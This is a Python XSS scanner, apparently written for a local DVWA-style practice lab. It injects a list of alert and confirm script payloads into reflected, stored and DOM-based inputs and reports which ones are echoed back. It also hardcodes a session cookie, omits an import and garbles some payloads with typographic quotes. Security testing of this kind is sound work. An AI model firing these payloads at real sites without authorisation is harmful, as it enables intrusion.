from selenium import webdriver
from urllib.parse import unquote
from urllib.parse import quote
from bs4 import BeautifulSoup

import os
import html
import requests



class Xss_r(object):
  payloads = ['<script>alert(123);</script>',
    '<ScRipT>alert("XSS");</ScRipT>',
    '<script>alert(123)</script>',
    '<script>alert("hellox worldss");</script>',
    '<script>alert(“XSS”)</script>',
    '<script>alert(“XSS”);</script>',
    '<script>alert(‘XSS’)</script>',
    '“><script>alert(“XSS”)</script>',
    '<script>alert(/XSS”)</script>',
    '<script>alert(/XSS/)</script>',
    '</script><script>alert(1)</script>',
    '‘; alert(1);',
    '‘)alert(1);//',
    '<ScRiPt>alert(1)</sCriPt>',
    '<IMG SRC=jAVasCrIPt:alert(‘XSS’)>',
    '<IMG SRC=”javascript:alert(‘XSS’);”>',
    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
    '<IMG SRC=javascript:alert(‘XSS’)>',
    '<img src=xss onerror=alert(1)>',
    '<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',
    "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",
    '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"']

  exists = os.path.isfile("payload.txt")

  if exists:
    f = codecs.open("payload.txt","r",encoding='utf-8',errors='ignore')
    payloads = f

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def Trigger(self):
    self.Reuqest()
    self.Payload()

  def Reuqest(self):

    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")

    name_list = []
    value_list = []

    if soup.form:
      for inputs in soup.form("input"):
        Type = inputs.attrs
        if 'name' in Type and Type['type'] == 'text':
          name_list.append('name')
          value_list.append(Type['name'])
        elif Type['type'].lower() == 'submit':
          name_list.append(Type['type'])
          value_list.append(Type['value'])

    get = soup.form['method'].lower()
    if get == 'get':
      self.param = dict(zip(name_list,value_list))


  def Payload(self):

    for num,payload in enumerate(Xss_r.payloads,start=0):
      self.param['name'] = payload
      rep = requests.get(self.url,cookies=self.cookies,params=self.param)
      if payload in rep.text:
        print("\033[1;32mvalid payload: \033[0m",payload)


class Xss_s(Xss_r):

  cookie = {'domain':'172.17.0.2','httponly':False,'name':'PHPSESSID','value':'24nr5an77p46e52bipuv7luv12','path':'/','secure':False}
  driver = webdriver.PhantomJS()

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies


  def Other_Trigger(self):
    self.Driver()


  def Driver(self):


    for each in self.cookies:
      self.cookie['name'] = each
      self.cookie['value'] = self.cookies[each]
      self.driver.add_cookie(self.cookie)


    self.driver.get(self.url)
    print(self.driver.title)
    print(self.driver.current_url)
    self.source = self.driver.page_source

    if self.driver.current_url != self.url:
      while True:
        self.driver.get(self.url)
        print(self.driver.current_url)
        if self.driver.current_url == self.url:
          break

    for payload in super().payloads:
      if "meta" in payload.strip() or "refresh" in payload.strip():
        continue

      name_payload = payload
      message_payload = payload
      self.driver.execute_script("document.getElementsByTagName('textarea')[0].maxLength = 10000;")
      self.driver.execute_script("document.getElementsByTagName('input')[0].maxLength = 10000;")
      self.driver.find_element_by_name('txtName').send_keys(name_payload)
      self.driver.find_element_by_name('mtxMessage').send_keys(message_payload)
      self.driver.find_element_by_name('btnSign').click()

      if name_payload.strip() in self.driver.page_source or name_payload.strip().lower() in self.driver.page_source or name_payload in self.driver.page_source:
        print("\033[1;32m name valid payload find: \033[0m",name_payload)
        if self.find():
          continue

      elif message_payload.strip() in self.driver.page_source or message_payload.strip().lower() in self.driver.page_source or message_payload in self.driver.page_source:
        print("\033[1;32m name valid payload find: \033[0m",message_payload,end='')
        print("call find")
        if self.find():
          continue

      else:
        #print("each don't have message")
        print("\033[1;31m"+payload+"\033[0m")
        if self.find():
          continue


    self.driver.quit()



  def find(self):
    while True:
      self.driver.find_element_by_name('btnClear').click()
      self.driver.switch_to_alert
      self.driver.execute_script("window.confirm = function(msg) { return true; }")
      if "guestbook_comments" in self.driver.page_source:
          continue
      else:
        return True



class Xss_d(Xss_s):


  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies


  def dom(self):
    self.dom_request()


  def dom_request(self):

    for cookie in self.cookies:
      self.cookie['name'] = cookie
      self.cookie['value'] = self.cookies[cookie]
      self.driver.add_cookie(self.cookie)

    self.driver.get(self.url)
    default = self.driver.find_element_by_tag_name("select").get_attribute('name')
    get = self.driver.find_element_by_tag_name("form").get_attribute("method")
    if get.lower() == 'get':
      Default = "?"+default+"="
      if self.cookies['security'] == 'high':
        Default = Default + "English"+"#"

    for payload in self.payloads:
      payload = payload.strip()



      url = self.url + Default + payload
      self.driver.get(url)
      value = self.driver.find_element_by_tag_name("option").get_attribute("value")

      self.driver.refresh()

      source = self.driver.page_source

      uncode = unquote(value)
      quote(payload)
      unentity = html.unescape(payload)
      one = html.unescape(quote(payload))
      two = unquote(unentity)


      if payload in source:
        print("\033[1;31mnormal\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif uncode == payload:
        print("\033[1;31mdecode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)
      elif quote(payload) in source:
        print("\033[1;31mdecode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif unentity in source:
        print("\033[1;31mhtml entity\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif one in source:
        print("\033[1;31muncode to html entity\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      elif two in source:
        print("\033[1;31mhtml entity to uncode\033[0m ","payload valid: \033[1;32m%s\033[0m " % payload)

      else:
        print("\033[1;33m"+payload+"\033[0m")

